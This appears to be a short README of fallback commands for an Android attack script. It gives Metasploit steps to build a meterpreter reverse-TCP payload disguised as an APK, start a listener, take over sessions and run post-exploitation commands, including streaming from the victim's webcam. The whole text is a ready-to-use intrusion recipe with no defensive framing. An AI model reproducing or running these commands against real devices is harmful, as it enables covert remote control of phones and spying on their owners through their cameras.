## This is the list of raw commands, if the script fails use this commands manually 

### 1. Creating APK
```sh 
msfvenom -p android/meterpreter/reverse_tcp LHOST=yourip LPORT=yourport > payload.apk
```
### 2. Setup Console
```sh
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST yourip
set LPORT yourport
set ExitOnSession false
```
### 3. Establish connection
```sh
exploit -j
sessions
sessions -i (active session number)
```
### 4. Msfconsole commands 
1. Get System Info:
  ```sysinfo ```
2. List Running Processes:
  ```ps```
3. Start Live Streaming from the Camera:
   ```webcam_stream```
4. List of all commands ```help```
